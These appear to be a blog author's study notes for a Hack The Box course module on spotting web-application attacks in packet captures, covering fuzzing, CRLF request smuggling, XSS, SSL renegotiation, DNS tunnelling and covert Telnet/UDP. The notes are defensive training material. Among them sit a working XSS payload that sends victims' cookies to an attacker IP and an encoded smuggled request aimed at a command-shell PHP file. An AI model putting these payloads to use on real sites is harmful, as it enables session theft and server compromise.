---
layout: post
title:  "NOTES: Application Layer Attacks: Intermediate Network Traffic Analysis"
date: 2025-03-9
author: C. Casquatch
comments: false
tag: ['traffic analysis', 'networking', 'http', 'XSS', 'telnet', 'udp', 'SSL', 'DNS', 'htb']
---


HTTP/HTTPS Service Enumeration
==============================

**Related PCAP File(s):**  
• basic\_fuzzing.pcapng

Introduction
------------

At times, we may observe unusual or excessive traffic directed at our web servers. This traffic could be part of an attacker's effort to gather information about the server, often using the HTTP or HTTPS protocols. Attackers exploit the transport layer due to vulnerabilities in the web applications hosted on the server. To defend against this, we need to be able to identify how an attacker may attempt to gather data, exploit weaknesses, and abuse our servers.

Detecting Fuzzing Attempts
--------------------------

There are several key indicators that can help us identify potential fuzzing attempts:

*   An abnormal amount of HTTP or HTTPS traffic originating from a single host.
*   Reviewing the web server’s access logs for unusual activity from the same host.

Typically, attackers fuzz web servers to gather information before trying to exploit it. While many organisations employ Web Application Firewalls (WAFs) to mitigate this, some servers, especially internal ones, may not have this protection.

Directory Fuzzing Detection
---------------------------

### What is Directory Fuzzing?

Directory fuzzing is a technique where attackers try to discover hidden pages or directories on a web server. They do this by sending requests for various URLs, some of which may not exist. These types of attacks are easy to detect, and they often involve the following patterns:

*   A host repeatedly requests non-existent files on the web server (resulting in a 404 Not Found error).
*   These requests are sent in quick succession.

### How to Detect Directory Fuzzing

To catch directory fuzzing in action, we can filter our network traffic to focus solely on HTTP traffic using Wireshark:

http

If you want to focus solely on requests (and exclude server responses), use the following filter:

http.request

Additionally, we can cross-reference this traffic with the web server’s access logs. For example, using **grep** to filter logs for requests from a specific IP address:

cat access.log | grep "192.168.10.5"

Alternatively, using **awk**:

cat access.log | awk '$1 == "192.168.10.5'"

Other Fuzzing Techniques
------------------------

Fuzzing can go beyond directory enumeration. Attackers might target dynamic or static elements of a web page, such as input fields or hidden parameters. For example, an attacker could try to exploit IDOR (Insecure Direct Object References) vulnerabilities, where they manipulate URL parameters (like changing `return=max` to `return=min`).

### Filtering Specific Hosts

To focus on traffic from a specific host, use the following filter:

http.request and ((ip.src\_host == <suspected IP>) or (ip.dst\_host == <suspected IP>))

Another way to investigate the traffic is to follow the entire HTTP stream by right-clicking a request and selecting "Follow" > "HTTP Stream". This can help piece together the context of the attack.

Staggering Attacks to Avoid Detection
-------------------------------------

More sophisticated attackers might attempt to avoid detection by:

*   Staggering the requests over a longer period of time.
*   Distributing the requests across multiple hosts or IP addresses.

Preventing Fuzzing Attacks
--------------------------

To defend against fuzzing, we can take several proactive measures:

*   **Ensure Correct Server Responses:** By configuring the server to return proper response codes for invalid requests (such as 404 for non-existent files), we can discourage attackers and disrupt their scanning.
*   **Block Suspicious IPs:** If we notice repeated fuzzing attempts from a specific IP address, we can block the address using our Web Application Firewall (WAF). This will prevent further attempts from that source.

### QUESTION

#### Inspect the basic_fuzzing.pcapng file, part of this module's resources, and enter the total number of HTTP packets that are related to GET requests against port 80 as your answer.
ANSWER:




Strange HTTP Headers
====================

**Related PCAP File(s):**  
• CRLF\_and\_host\_header\_manipulation.pcapng


* * *

When analysing the traffic to our web server, we may not immediately notice signs of fuzzing or malicious activity. However, this does not necessarily mean that everything is running smoothly. A closer inspection of the HTTP requests can reveal unusual behaviour, which might indicate an attack or vulnerability. Some of the strange patterns we should be on the lookout for include:

*   Unusual Hosts (Host: )
*   Abnormal HTTP Verbs
*   Altered User Agents

Identifying Odd Host Headers
----------------------------

To start, we can narrow down the traffic in Wireshark by focusing solely on HTTP requests and responses:

http

Next, we can filter the traffic to look for any irregularities in the Host headers. To do so, we can specify the legitimate IP address of our web server to exclude its normal traffic:

http.request and (!(http.host == "192.168.10.7"))

If this filter returns any results, we can further investigate the suspicious HTTP requests to identify the hosts being used. Commonly, we may notice addresses like `127.0.0.1` or something more unusual, such as `admin`.

Attackers often use modified Host headers to gain access to areas of the server that would not typically be available to them. Tools like Burp Suite are often used to manipulate headers before sending requests to the server. To prevent exploitation, we should take the following steps:

*   Ensure our virtual hosts and access configurations are properly set up to block unauthorised access.
*   Keep our web server up to date with the latest security patches.

Investigating 400 Errors and Request Smuggling
----------------------------------------------

While investigating web server traffic, we may come across 400 Bad Request responses. These indicate that the server has received a malformed or invalid request from the client, which could be an indication of malicious activity. We can filter for these errors in Wireshark using:

http.response.code == 400

If we follow the HTTP stream of one of these responses, we may see something like this:

GET%20%2flogin.php%3fid%3d1%20HTTP%2f1.1%0d%0aHost%3a%20192.168.10.5%0d%0a%0d%0aGET%20%2fuploads%2fcmd2.php%20HTTP%2f1.1%0d%0aHost%3a%20127.0.0.1%3a8080%0d%0a%0d%0a%20HTTP%2f1.1 Host: 192.168.10.5

This is a typical example of HTTP request smuggling or CRLF injection, where an attacker crafts two HTTP requests in one. The first request might go through while the second gets sent after, potentially bypassing security measures and gaining unauthorised access.

If we decode the above example, it would look like this:

GET /login.php?id=1 HTTP/1.1
    Host: 192.168.10.5

    GET /uploads/cmd2.php HTTP/1.1
    Host: 127.0.0.1:8080

    HTTP/1.1
    Host: 192.168.10.5

When server configurations are vulnerable, the first request may succeed, followed shortly by the second, which could allow an attacker to exploit the server. This often happens if the server's configuration is misconfigured to allow proxying. For instance, an Apache configuration that allows a ProxyPass rule could look like this:

    <VirtualHost *:80>
            RewriteEngine on
            RewriteRule "^/categories/(.*)" "http://192.168.10.100:8080/categories.php?id=$1" [P]
            ProxyPassReverse "/categories/" "http://192.168.10.100:8080/"
        </VirtualHost>

This is a known vulnerability and could allow an attacker to perform actions they should not be able to, using techniques like **CVE-2023-25690**.

As we monitor for these types of suspicious activities, 400 error responses are particularly useful as indicators of potential attack attempts. We should be cautious, especially if we observe a 200 OK response following such anomalies, which indicates a successful exploitation attempt.

### QUESTION

#### Inspect the CRLF_and_host_header_manipulation.pcapng file, part of this module's resources, and enter the total number of HTTP packets with response code 400 as your answer.
ANSWER:




Cross-Site Scripting (XSS) & Code Injection Detection
=====================================================

**Related PCAP File(s):**  
• XSS\_Simple.pcapng

* * *

While reviewing HTTP requests, we may observe some unusual activity, such as multiple requests directed to an unfamiliar internal "server." This could be an indication of a potential cross-site scripting (XSS) attack. Let’s look at a potential scenario.

In many cases, this traffic may not immediately raise suspicions. For example, it might appear as if numerous values are being transferred, which, upon closer inspection, may be user's cookies, tokens, or session identifiers. These values may even be encoded or encrypted during transmission. This is characteristic of an XSS attack, where a malicious attacker injects JavaScript or script code into a webpage via user input. When other users visit the compromised web page, the browser will execute this malicious script.

Such attacks are often used to steal session tokens, cookies, or other sensitive information from users. When following one of these suspicious requests, the payload may look something like this:

Example of XSS Payload
----------------------

  window.addEventListener("load", function() {
    const url = "http://192.168.0.19:5555";
    const params = "cookie=" + encodeURIComponent(document.cookie);
    const request = new XMLHttpRequest();
    request.open("GET", url + "?" + params);
    request.send();
  });
    

This script will send the victim’s cookie to the attacker’s server. Identifying the source of this malicious code can sometimes be difficult, but suppose the compromised input came from a user comment section on the site. We might notice something like the following in a comment:

Example of Malicious Code Injection in PHP
------------------------------------------

Or perhaps a command injection attempt, where an attacker tries to run a command on the server:

Preventing XSS and Code Injection
---------------------------------

To mitigate the risks associated with XSS and code injection attacks, it is important to implement preventive measures. If an attack is detected, consider taking the following actions:

*   Sanitise user input thoroughly and only allow acceptable characters or formats.
*   Avoid interpreting user input as executable code.

By properly managing user input and validating it, we can protect our web servers and prevent these types of attacks from succeeding.

### QUESTION

#### Inspect the first packet of the XSS_Simple.pcapng file, part of this module's resources, and enter the cookie value that was exfiltrated as your answer.
ANSWER:




SSL Renegotiation Attacks
=========================

**Related PCAP File(s):**  
• SSL\_renegotiation\_edited.pcapng

* * *

When analysing network traffic, you may occasionally encounter encrypted HTTPs traffic, as opposed to unencrypted HTTP traffic. It's essential to recognise signs of malicious HTTPS traffic to help with your analysis efforts.

Understanding HTTPS
-------------------

HTTPS differs from HTTP in that it incorporates encryption, providing an extra layer of security for communications between web servers and clients. It achieves this with two core technologies:

*   Transport Layer Security (TLS)
*   Secure Sockets Layer (SSL)

When a client establishes an HTTPS connection with a server, the following steps occur:

1.  **Handshake:** The client and server initiate a handshake. During this process, they agree on the encryption algorithms to use and exchange certificates.
2.  **Encryption:** After the handshake, both parties use the agreed-upon encryption algorithms to secure the data exchanged.
3.  **Data Exchange:** Once the connection is encrypted, data such as web pages, images, or other resources is exchanged securely.
4.  **Decryption:** Data is decrypted with private and public keys during the exchange between the client and server.

Common HTTPS Attacks: SSL Renegotiation
---------------------------------------

One common HTTPS-based attack is SSL renegotiation, where an attacker forces the session to use the weakest possible encryption, compromising security. Another attack to be aware of is the [Heartbleed vulnerability](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160) (CVE-2014-0160), which affected older versions of OpenSSL.

The SSL/TLS Handshake Process
-----------------------------

To establish an encrypted connection, both the client and server perform a handshake. The steps are fairly similar between SSL and TLS handshakes. Here's what typically happens:

1.  **Client Hello:** The client sends a message to the server containing supported TLS/SSL versions, cipher suites, and random data (nonces).
2.  **Server Hello:** The server responds with its chosen TLS/SSL version, the selected cipher suite, and another nonce.
3.  **Certificate Exchange:** The server sends its digital certificate, which includes the public key used for key exchange.
4.  **Key Exchange:** The client generates a "premaster secret," encrypts it using the server's public key, and sends it to the server.
5.  **Session Key Derivation:** Both parties use the premaster secret and nonces to compute session keys for symmetric encryption.
6.  **Finished Messages:** To verify successful handshake completion, both the client and server exchange finished messages that include encrypted hashes of all previous handshake messages.
7.  **Secure Data Exchange:** Finally, once the handshake is complete, the client and server begin exchanging data over the encrypted channel.

Looking at the SSL/TLS Handshake Algorithm
------------------------------------------

Here’s a more technical breakdown of the handshake process:

Handshake Step

Relevant Calculations

Client Hello

ClientHello = {ClientVersion, ClientRandom, Ciphersuites, CompressionMethods}

Server Hello

ServerHello = {ServerVersion, ServerRandom, Ciphersuite, CompressionMethod}

Certificate Exchange

ServerCertificate = {ServerPublicCertificate}

Key Exchange

• ClientDHPrivateKey  
• ClientDHPublicKey = DH\_KeyGeneration(ClientDHPrivateKey)  
• ClientKeyExchange = {ClientDHPublicKey}  
• ServerDHPrivateKey  
• ServerDHPublicKey = DH\_KeyGeneration(ServerDHPrivateKey)  
• ServerKeyExchange = {ServerDHPublicKey}

Premaster Secret

• PremasterSecret = DH\_KeyAgreement(ServerDHPublicKey, ClientDHPrivateKey)  
• PremasterSecret = DH\_KeyAgreement(ClientDHPublicKey, ServerDHPrivateKey)

Session Key Derivation

MasterSecret = PRF(PremasterSecret, "master secret", ClientNonce + ServerNonce)  
KeyBlock = PRF(MasterSecret, "key expansion", ServerNonce + ClientNonce)

Extraction of Session Keys

• ClientWriteMACKey = First N bytes of KeyBlock  
• ServerWriteMACKey = Next N bytes of KeyBlock  
• ClientWriteKey = Next N bytes of KeyBlock  
• ServerWriteKey = Next N bytes of KeyBlock  
• ClientWriteIV = Next N bytes of KeyBlock  
• ServerWriteIV = Next N bytes of KeyBlock

Finished Messages

FinishedMessage = PRF(MasterSecret, "finished", Hash(ClientHello + ServerHello))

Detecting SSL Renegotiation Attacks
-----------------------------------

To identify irregularities during the handshake, we can use tools such as TCPdump and Wireshark. In Wireshark, we can filter for handshake messages with the following filter:

ssl.record.content\_type == 22

The "content\_type 22" indicates handshake messages only. After applying this filter, we can look for signs of SSL renegotiation attacks.

### Indicators of SSL Renegotiation Attacks

*   **Multiple Client Hellos:** A clear sign of an SSL renegotiation attack is when you observe multiple client hellos from a single client within a short period. The attacker repeats this message to trigger renegotiation, trying to force the server into using a lower cipher suite.
*   **Out-of-Order Handshake Messages:** Typically, SSL renegotiation attacks cause packets to be received out of order, such as receiving a client hello after the handshake has already been completed.

Why Attackers Use SSL Renegotiation
-----------------------------------

SSL renegotiation attacks can be used for various malicious purposes, including:

*   **Denial of Service (DoS):** By consuming significant resources, these attacks can overwhelm a server, rendering it unresponsive.
*   **Exploiting Weaknesses in SSL/TLS:** The attacker may be attempting to exploit vulnerabilities in the server's SSL/TLS implementation, such as weak cipher suites.
*   **Cryptanalysis:** SSL renegotiation can be part of an overall strategy to analyse SSL/TLS patterns and find weaknesses for other systems.

### QUESTION

#### Inspect the SSL_renegotiation_edited.pcapng file, part of this module's resources, and enter the total count of "Client Hello" requests as your answer.
ANSWER:




Peculiar DNS Traffic
====================

* * *

DNS traffic can often be overwhelming to examine, especially when clients generate large amounts of it, and suspicious activity may get lost in the sheer volume. Nevertheless, understanding how DNS works and identifying signs of malicious activity are essential for effective traffic analysis.

DNS Queries
-----------

When a client needs to resolve a domain name to an IP address (or vice versa), DNS queries are initiated. Let's look at one of the most common types: forward lookups.

### Forward Lookup Queries

In a forward lookup query, a client sends a request to resolve a domain name to an IP address. For example:

*   **Request:** Where is academy.hackthebox.com?
*   **Response:** It's at 192.168.10.6

### Steps Involved in a Forward Lookup

Step

Description

1\. Query Initiation

The client initiates a DNS query to resolve the domain name (e.g., academy.hackthebox.com) into an IP address.

2\. Local Cache Check

The client checks its local cache to see if it already has the IP address of the domain. If not, it proceeds to the next step.

3\. Recursive Query

If the information is not found locally, the client sends a recursive query to its DNS server (either local or remote).

4\. Root Servers

The DNS resolver queries the root name servers, which direct it to the authoritative name servers for the top-level domain (TLD).

5\. TLD Servers

The root server responds with the authoritative name servers for the domain's TLD (e.g., .com or .org).

6\. Authoritative Servers

The DNS resolver queries the TLD’s authoritative name servers to obtain the second-level domain (e.g., hackthebox.com).

7\. Domain Name’s Authoritative Servers

The DNS resolver queries the domain's authoritative name servers to get the IP address associated with the domain (e.g., academy.hackthebox.com).

8\. Response

The DNS resolver sends the resolved IP address (A or AAAA record) back to the client.

DNS Reverse Lookups/Queries
---------------------------

In contrast to forward lookups, DNS reverse lookups occur when a client already knows the IP address and wishes to determine the corresponding Fully Qualified Domain Name (FQDN).

### Reverse Lookup Query Example

*   **Request:** What is the name for 192.168.10.6?
*   **Response:** It’s academy.hackthebox.com.

### Steps in a Reverse Lookup

Step

Description

1\. Query Initiation

The client sends a reverse DNS query to its DNS server with the IP address it wants to resolve.

2\. Reverse Lookup Zones

The DNS resolver checks if it's authoritative for the reverse lookup zone corresponding to the IP address range (e.g., 1.2.0.192.in-addr.arpa for 192.0.2.1).

3\. PTR Record Query

The DNS resolver looks for a PTR record in the reverse lookup zone corresponding to the provided IP address.

4\. Response

If a matching PTR record is found, the DNS server responds with the FQDN of the IP address.

DNS Record Types
----------------

DNS supports various record types, each serving a different purpose. Familiarity with these record types is important when monitoring DNS traffic:

Record Type

Description

A (Address)

Maps a domain name to an IPv4 address.

AAAA (IPv6 Address)

Maps a domain name to an IPv6 address.

CNAME (Canonical Name)

Creates an alias for the domain name (e.g., hello.com = world.com).

MX (Mail Exchange)

Specifies the mail server responsible for receiving emails on behalf of the domain.

NS (Name Server)

Specifies authoritative name servers for a domain.

PTR (Pointer)

Used in reverse queries to map an IP address to a domain name.

TXT (Text)

Contains text information associated with the domain.

SOA (Start of Authority)

Contains administrative information about the zone.

Identifying DNS Enumeration Attempts
------------------------------------

Upon inspecting raw DNS traffic in Wireshark, you may notice an unusual volume of queries from a single host, which could be indicative of DNS enumeration. This can sometimes be accompanied by queries of type "ANY", suggesting potential subdomain enumeration.

Related PCAP File: dns\_enum\_detection.pcapng

Detecting DNS Tunnelling
------------------------

Another suspicious behaviour involves the use of DNS tunnelling. This can occur when attackers use DNS queries, particularly the TXT record type, for data exfiltration. The data might be encoded or encrypted and appear as random strings in the query.

Related PCAP File: dns\_tunneling.pcapng

### Steps to Identify DNS Tunnelling

If you suspect DNS tunnelling, look out for an abundance of text records from a single host. A typical tunnelling scenario would involve encoded data, which can be retrieved from Wireshark and decoded using base64:

        echo 'VTBaU1EyVXhaSFprVjNocldETnNkbVJXT1cxaU0wb3pXVmhLYTFneU1XeFlNMUp2WVZoT1ptTklTbXhrU0ZJMVdETkNjMXBYUm5wYQpXREJMQ2c9PQo=' | base64 -d
    

Reasons Behind DNS Tunnelling
-----------------------------

Attackers may utilise DNS tunnelling for several reasons:

*   **Data Exfiltration:** Tunnelling allows attackers to send stolen data out of the network covertly.
*   **Command and Control:** Some malware uses DNS tunnelling to communicate with a remote command-and-control server, commonly seen in botnets.
*   **Bypassing Firewalls and Proxies:** DNS traffic is often overlooked by security systems, making it an effective channel for malicious activity.
*   **Domain Generation Algorithms (DGAs):** Some advanced malware uses DNS tunnels to communicate with C&C servers via dynamically generated domain names.

The Interplanetary File System (IPFS) and DNS Tunnelling
--------------------------------------------------------

Recent trends show that threat actors are increasingly using the Interplanetary File System (IPFS) for storing and retrieving malicious files. As such, it's important to monitor DNS and HTTP/HTTPS traffic to suspicious URIs such as:

[https://cloudflare-ipfs.com/ipfs/QmS6eyoGjENZTMxM7Ud](https://cloudflare-ipfs.com/ipfs/QmS6eyoGjENZTMxM7UdqBk6Z3U3TZPAVeJXdgp9VK4o1Sz)

Other resources: [Interplanetary File System (IPFS)](https://developers.cloudflare.com/web3/ipfs-gateway/concepts/ipfs/)

### QUESTION

#### Enter the decoded value of the triple base64-encoded string that was mentioned in this section as your answer. Answer format: HTB{___}
ANSWER:




Unusual Telnet and UDP Connections
==================================

When we are monitoring traffic, it's crucial not to overlook Telnet and UDP traffic. These types of traffic might be easily missed, but they can be telling during traffic analysis.

Telnet
------

Telnet is a network protocol that enables two devices to establish an interactive communication session over a network. It was developed in the 1970s and defined in RFC 854. However, Telnet has largely fallen out of favour in recent years, with SSH becoming the preferred protocol.

Despite its decline, older systems (such as those based on Windows NT) might still use Telnet for remote command and control, especially in Microsoft terminal services. It's essential to stay alert for unusual Telnet traffic, as it can be used by attackers for malicious activities, including data exfiltration and tunnelling.

### Detecting Traditional Telnet Traffic on Port 23

**Related PCAP File(s):**  
telnet\_tunneling\_23.pcapng

When examining raw traffic in Wireshark, Telnet communications typically occur over Port 23. If you come across such traffic, it’s worth investigating further.

Fortunately, Telnet traffic is often unencrypted and relatively easy to inspect. However, much like with ICMP, DNS, and other tunnelling methods, attackers might encrypt, encode, or obfuscate Telnet traffic. Thus, always exercise caution.

### Identifying Unusual Telnet on Other TCP Ports

**Related PCAP File(s):**  
telnet\_tunneling\_9999.pcapng

Telnet, being a communication protocol, is not limited to Port 23. Attackers may switch to other ports to evade detection. For example, you may notice substantial traffic originating from Port 9999. In such cases, it's prudent to dive deeper into the communication by inspecting the contents.

If you see unusual patterns, following the TCP stream will help you investigate further and identify any malicious activities.

### Telnet Protocol via IPv6

**Related PCAP File(s):**  
telnet\_tunneling\_ipv6.pcapng

If your network isn't configured to use IPv6, observing IPv6 traffic could signal suspicious activity. For example, Telnet traffic might appear over IPv6 addresses, as seen in the example below.

You can refine your filter in Wireshark to show only Telnet traffic related to these addresses using the following filter:

    ((ipv6.src_host == fe80::c9c8:ed3:1b10:f10b) or (ipv6.dst_host == fe80::c9c8:ed3:1b10:f10b)) and telnet

From there, you can inspect the packet contents or follow the TCP stream to explore the data further.

Monitoring UDP Communications
-----------------------------

**Related PCAP File(s):**  
udp\_tunneling.pcapng

Attackers may also use UDP connections for data exfiltration. Unlike TCP, UDP is connectionless, providing fast transmission without the need for connection establishment, which makes it useful for evading detection.

If you observe UDP traffic, you can follow the same steps as with TCP traffic to inspect its contents in Wireshark.

### Common Uses of UDP

While UDP is less reliable than TCP, its connectionless nature enables faster connections. This feature is particularly useful for real-time communications and other applications. Common legitimate uses of UDP traffic include:

Step

Description

1\. Real-time Applications

Streaming media, online gaming, and real-time voice and video communications rely on UDP.

2\. DNS (Domain Name System)

UDP is used for DNS queries and responses.

3\. DHCP (Dynamic Host Configuration Protocol)

DHCP uses UDP to assign IP addresses and other configuration details to devices on the network.

4\. SNMP (Simple Network Management Protocol)

SNMP utilises UDP for network monitoring and management.

5\. TFTP (Trivial File Transfer Protocol)

TFTP, often used by older systems, uses UDP for file transfers.

### QUESTION

#### Inspect the telnet_tunneling_ipv6.pcapng file, part of this module's resources, and enter the hidden flag as your answer. Answer format: HTB(___) (Replace all spaces with underscores)
ANSWER:



<button onclick="history.back()">Go Back</button>
